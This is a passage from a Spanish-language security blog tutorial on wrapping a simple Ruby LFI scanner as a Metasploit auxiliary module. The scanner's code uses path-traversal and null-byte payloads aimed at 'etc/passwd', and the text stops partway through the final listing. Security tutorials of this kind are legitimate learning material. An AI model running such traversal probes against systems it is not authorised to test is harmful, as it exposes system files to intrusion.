
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Escribiendo Un Auxiliar Para MSF - Security</title>
  <meta name="author" content="q3rv0">

  
  <meta name="description" content="La idea de comenzar a aprender ruby llego solo por el echo de poder ver en la consola del msf un auxiliar escrito por mi, la API de metasploit no es &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Security</a></h1>
  
    <h2>Follow the white rabbit&#8230;.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:q3rv0.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Escribiendo Un Auxiliar Para MSF</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-23T03:20:10+06:30'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:20 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p><img src="http://i.imgur.com/boJZ1iI.jpg"></p>

<p>La idea de comenzar a aprender ruby llego solo por el echo de poder ver en la consola del msf un auxiliar escrito por mi, la API de metasploit no es un muy complicadad de llevar y con solo unos dias de practica, y es mas, ya estando familiarizados con otros lenguajes similares como lo son python y perl la forma de tomar el control de ruby se hace mas llevadera que comenzar desde cero, <!--more-->por suspuesto no estoy diciendo que sean realmente identicos pero ambos lenguajes poseen ciertas caracteristicas como la sencilles de su sintaxis, entre otras.</p>

<p>Durante este tutorial se mostrara paso a paso como aderir nuestra herramienta escrita en ruby como modulo auxiliar de msf. Para ello programe un sencillo scanner de LFI.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Autor: [Q]3rV[0]</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>        <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Se le debera pasar como argumentos el parametro vulnerable y un numero que indicara la cantidad de ‘../’  que realizara la inyeccion.</p>

<p><img src="http://i.imgur.com/w3ALLIF.png"></p>

<p>Lo primero que haremos sera importar el modulo msf/core y crer una clase en la cual heredaremos los metodos de Msf::Auxiliary.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Luego crearemos el metodo initialize que contendra dos funciones: super() y register_options().</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>super() contendra la informacion de nuestro auxiliar, tales como la version, el nombre del autor, la descripcion del modulo, etc.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Por otro lado register_options() contendra las opciones del auxiliar, y es donde definiremos los argumentos para luego setearlos desde msf.</p>

<p>La funcion tomara dos argumentos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">register_options</span><span class="p">(</span><span class="o">[]</span><span class="p">,</span><span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Dentro del array definiremos las opciones teniendo tipos como:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para valores enteros</span>
</span><span class='line'><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para cadenas</span>
</span><span class='line'><span class="no">OptAddress</span><span class="o">.</span><span class="n">new</span><span class="p">()</span> <span class="c1"># Para direcciones</span>
</span></code></pre></td></tr></table></div></figure>


<p>En nuestro caso quedaria de la siguiente manera</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
</span><span class='line'>                  <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Fijense la sintaxis de Optxxx</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Recibe dos argumentos, el primero indica el nombre del parametro, el segundo es un array que contiene como primer indice un valor boleano que indica si es prescindible definir esa variable, y el segundo indice contiene la descripcion de la opcion.</p>

<p>Bien, ahora pasemos a la parte donde hubicaremos el codigo del scanner.</p>

<p>Definiremos otro metodo llamado run() donde incluiremos el codigo.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
</span><span class='line'>                  <span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TRAVERSAL&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Path traversal&#39;</span><span class="o">]</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">host</span><span class="o">=</span><span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">=~</span> <span class="sr">/root:/</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Parametro vulnerable a LFI -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="nb">puts</span> <span class="s2">&quot;Not Found -&gt; </span><span class="si">#{</span><span class="n">vector</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">pb</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">a</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">while</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">pb</span>
</span><span class='line'>            <span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">traversal</span><span class="o">=</span><span class="s2">&quot;../&quot;</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">file</span>
</span><span class='line'>            <span class="n">vector</span><span class="o">=</span><span class="n">web</span><span class="o">+</span><span class="n">traversal</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">data</span><span class="o">=</span><span class="n">conn</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">compr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">vector</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">lfi</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span><span class="p">,</span> <span class="s2">&quot;etc/passwd%00&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pero todavia falta el pasaje de los argumentos y eso lo haremos con datastore[&lsquo;PARAMETRO&rsquo;], donde PARAMETRO seran los antes definidos con Optxxx.new()</p>

<p>Quedando finalizado nuestro modulo auxiliar para Msf.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">initialize</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">super</span><span class="p">(</span>
</span><span class='line'>        <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;LFI scanner&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;1.0&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Scanner para realizar inyecciones LFI&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[Q]3rV[0]&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s1">&#39;License&#39;</span><span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span>
</span><span class='line'>         <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">register_options</span><span class="p">(</span><span class="o">[</span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span><span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;Indique el target&#39;</span><span class="o">]</span><span class="p">),</span>
